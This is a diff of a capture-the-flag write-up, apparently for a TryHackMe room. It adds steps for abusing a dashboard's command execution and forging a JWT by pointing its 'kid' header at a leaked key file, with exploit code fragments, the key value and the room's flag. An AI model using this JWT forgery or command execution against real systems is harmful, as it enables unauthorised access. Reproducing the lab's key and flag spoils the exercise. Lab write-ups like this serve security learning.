@@ -2,11 +2,17 @@
 
 ## Exploring RCE
 
-...
+From the dashboard page (/`dashboard.php`), I tried executing a few common commands such as `whoami`, `id`, `pwd`, etc.
 
 It appears that the application only allows the `ls` command. From the output, I noticed an interesting file: `188ade1.key`.
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Visiting the URL at `/188ade1.key` downloads a file with the content:&#x20;
+
+```
+56058354efb3daa97ebab00fabd7a7d7
+```
 
 ## Exploiting JWT
 
@@ -60,7 +66,7 @@ class JWT_KID_EXPLOIT():
         }
 
         token = jwt.encode(payload, key, algorithm='HS256', headers=headers)
-        command = 'cat /home/ubuntu/flag.txt'  # command to read flag
+        command = 'xxx'  # command to read flag
 
         print(f'[INFO] token={token}')
 
@@ -142,11 +148,13 @@ Remove the jwt.encode() line, and retrieve the token from the existing cookies i
 
 Output:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 3. Vulnerable `kid` header value
 
-...
+In this application which uses a symmetric key, the `kid` value defines the path used to look up a value to be used as the signing key.
+
+I attempted to change the kid value to `188ade1.key`, and encode a new JWT with the content of that file.
 
 ```python
  key = '56058354efb3daa97ebab00fabd7a7d7'
@@ -156,7 +164,15 @@ Output:
    "alg": "HS256",
    "kid": "188ade1.key"  # changed from '/var/html/mykey.key' -> '188ade1.key'
  }
+ 
+ command = 'cat /home/ubuntu/flag.txt'
 ```
+
+With the command: `cat /home/ubuntu/flag.txt`, I was able to retrieve the flag!
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+We have found the answer to the final question: "_What is the content of the file /home/ubuntu/flag.txt?_": `THM{RUNANYCOMMAND1337}` .
 
 
 
